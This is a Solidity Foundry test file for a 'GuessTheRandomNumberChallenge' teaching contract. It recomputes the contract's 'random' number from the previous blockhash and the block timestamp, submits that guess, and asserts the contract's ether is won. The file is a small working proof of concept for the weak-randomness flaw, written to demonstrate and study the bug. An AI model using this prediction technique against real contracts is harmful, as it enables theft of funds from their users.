
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {GuessTheRandomNumberChallenge} from "../src/GuessTheRandomNumberChallenge.sol";

contract TestWeakRandomnessGuessTheRandomNumberChallenge is Test {

    GuessTheRandomNumberChallenge public _contractUnderTest;

    function setUp() public {
        // Deployment is handled in the test function to allow fuzzing of block parameters
    }

    receive() external payable {}

    function test_highlightPredictableRandomValue(uint256 blockTimestamp, uint256 blockNumber) public {
        
        // --- 1. Constraints ---
        // Ensure blockNumber is at least 1 to avoid underflow on blockhash calculation
        vm.assume(blockNumber > 0);
        vm.assume(blockTimestamp > 0);

        // --- 2. State Configuration ---
        
        vm.warp(blockTimestamp);
        vm.roll(blockNumber);
        
        // Fund the test contract: 1 ether for deployment, 1 ether for the guess
        vm.deal(address(this), 2 ether);

        // Deploy the contract within the manipulated environment
        _contractUnderTest = new GuessTheRandomNumberChallenge{value: 1 ether}();

        // --- 3. Replication & Assertion ---
        
        // Replicate the vulnerable logic locally
        // The contract calculates randomness using blockhash(block.number - 1) and block.timestamp
        uint8 expectedRandom = uint8(uint256(keccak256(abi.encodePacked(blockhash(blockNumber - 1), blockTimestamp))));
        
        // Execute the guess with the predicted value
        _contractUnderTest.guess{value: 1 ether}(expectedRandom);

        // Assert Predictability
        assertTrue(_contractUnderTest.isComplete(), "Contract balance should be 0 after successful guess");
    }
}
